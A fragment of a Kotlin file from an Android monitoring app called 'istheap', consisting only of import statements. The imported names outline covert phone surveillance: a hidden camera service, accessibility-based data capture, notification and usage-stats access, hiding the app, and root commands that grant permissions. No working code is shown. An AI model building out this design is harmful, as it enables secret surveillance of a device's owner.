...
import com.github.midros.istheap.utils.ConstFun.isNotificationServiceRunning
import com.github.midros.istheap.utils.hiddenCameraServiceUtils.HiddenCameraUtils.canOverDrawOtherApps
import com.github.midros.istheap.utils.hiddenCameraServiceUtils.HiddenCameraUtils.openDrawOverPermissionSetting
import com.github.midros.istheap.utils.hiddenCameraServiceUtils.config.CameraFacing
import com.github.midros.istheap.utils.ConstFun.openUseAccessSettings
import com.github.midros.istheap.utils.checkForegroundApp.CheckPermission.hasUsageStatsPermission
...
import com.github.midros.istheap.data.preference.DataSharePreference.childSelected
import com.github.midros.istheap.services.accessibilityData.AccessibilityDataService
import com.github.midros.istheap.utils.ConstFun.isAddWhitelist
import com.github.midros.istheap.utils.ConstFun.isAndroidM
import com.github.midros.istheap.utils.ConstFun.openAccessibilitySettings
import com.github.midros.istheap.utils.ConstFun.openNotificationListenerSettings
import com.github.midros.istheap.utils.ConstFun.openWhitelistSettings
import com.github.midros.istheap.utils.ConstFun.permissionRoot
import com.github.midros.istheap.utils.ConstFun.showApp
import com.github.midros.istheap.utils.Consts
import com.github.midros.istheap.utils.Consts.CHILD_NAME
import com.github.midros.istheap.utils.Consts.COMMAND_ADD_WHITELIST
import com.github.midros.istheap.utils.Consts.COMMAND_ENABLE_ACCESSIBILITY
import com.github.midros.istheap.utils.Consts.COMMAND_ENABLE_ACCESSIBILITY_1
import com.github.midros.istheap.utils.Consts.COMMAND_ENABLE_NOTIFICATION_LISTENER
import com.github.midros.istheap.utils.Consts.COMMAND_GRANT_PERMISSION
import com.github.midros.istheap.utils.Consts.DEVICE_NAME
import com.github.midros.istheap.utils.Consts.INTERVAL
import com.github.midros.istheap.utils.Consts.PERMISSION_USAGE_STATS
import com.github.midros.istheap.utils.Consts.TIMER
import com.github.midros.istheap.utils.async.AsyncTaskRunCommand
import com.github.midros.istheap.utils.checkForegroundApp.CheckPermission.getModeManager
